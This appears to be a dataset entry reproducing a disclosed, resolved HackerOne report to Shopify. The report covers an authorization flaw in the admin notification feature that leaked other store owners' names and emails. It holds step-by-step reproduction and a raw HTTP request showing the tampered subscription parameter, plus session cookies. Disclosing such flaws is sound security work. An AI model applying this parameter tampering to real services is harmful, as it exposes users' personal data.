@@ -1,0 +1,90 @@
+---
+source: hackerone
+dataset: elamaran619/hackerone_disclosed_reports
+h1_id: '56936'
+original_report_id: '56936'
+title: Notification request disclose private information about other myshopify accounts
+weakness: Improper Authentication - Generic
+team_handle: shopify
+created_at: '2015-04-17T14:39:07.291Z'
+disclosed_at: '2015-09-24T03:24:56.776Z'
+has_bounty: true
+visibility: full
+substate: resolved
+vote_count: 3
+tags:
+- hackerone
+- improper-authentication-generic
+---
+
+# Notification request disclose private information about other myshopify accounts
+
+## Metadata
+
+- HackerOne Report ID: 56936
+- Weakness: Improper Authentication - Generic
+- Program: shopify
+- Disclosed At: 2015-09-24T03:24:56.776Z
+- Has Bounty: Yes
+- Visibility: full
+- Substate: resolved
+
+## Original Report
+
+Hello
+Attacker, using notification feature in Admin panel, can successfully disclose\enumerate Shopify customers and retrieve their user-id, first+last name and email address.  Last part of information is most avluble piece of information, since it can be used to conduct targeted attack on Shopify customers [via email] to infect end-user machines and\or gain access to Shopify accounts. 
+##POC
+1. Login as Attacker to evilshop.myshopify.com/admin
+2. Go to Settings/Notifications/Order notifications" and create new notification for Stuff member. Choose Yourself
+3. Capture request and see new notification created.  
+4. In captured request, alter order_subscription%5Border_subscription_type%5D value
+in this case Attacker replace his  ID with victim ID
+5. Attacker observe  "evilshop.myshopify.com/admin/Settings/Notifications/Order notifications"
+5.1  In case User ID is not registered\valid -  another Notification showed in list with Attacker UserID.
+5.2  In case User ID is registered\valid  - in list of Notifications appear new Victim "Stuff member" , with First + Last name and email address, as registered in Victim profile in his settings.
+
+##On screenshot attached:
+Rama Kama is Attacker and owner of this store, and Victim is owner of totally different store, which ID was spoofed to system.
+
+#Request example:
+
+POST /admin/order_subscriptions HTTP/1.1
+Accept: text/html, application/xhtml+xml, application/xml
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-XHR-Referer: https://testrua7.myshopify.com/admin/settings/notifications
+X-CSRF-Token: f25hau8h3JWDKUqYJvG2sYPAUMXDsieiueb5dr4GsUU=
+Referer: https://testrua7.myshopify.com/admin/settings/notifications
+Accept-Language: en-US
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+Host: testrua7.myshopify.com
+Content-Length: 258
+DNT: 1
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: __utma=1.2093583371.1428608245.1429207096.1429250267.13; __utmz=1.1428609079.2.2.utmcsr=cio|utmccn=welcome_online|utmcmd=email|utmcct=log_in_store_btn; _ga=GA1.2.2093583371.1428608245; __mmapiwsid=30D865E4-E464-11E4-91DC-547B559CF7BD:8f1edbf6d83d5ddc80b7a3d442de809495f02f1b; __utmb=1.47.10.1429250656; _gat=1; __utmc=1; _secure_admin_session_id=a5dcb62e34ad0ccde4c785efe915374e; request_method=GET
+
+utf8=%E2%9C%93&authenticity_token=f25hau8h3JWDKUqYJvG2sYPAUMXDsieiueb5dr4GsUU%3D&order_subscription%5Border_subscription_type%5D=user-7837569&order_subscription%5Blocation_id%5D=&order_subscription%5Baddress%5D=&order_subscription%5Bprovider%5D=&_method=post
+
+## Extracted Security Notes
+
+### Likely Vulnerability Class
+
+*Leave this section for future enrichment.*
+
+### Likely Root Cause
+
+*Leave this section for future enrichment.*
+
+### Potential Impact
+
+*Leave this section for future enrichment.*
+
+### Defensive Test Cases
+
+*Leave this section for future enrichment.*
+
+### Remediation Ideas
+
+*Leave this section for future enrichment.*
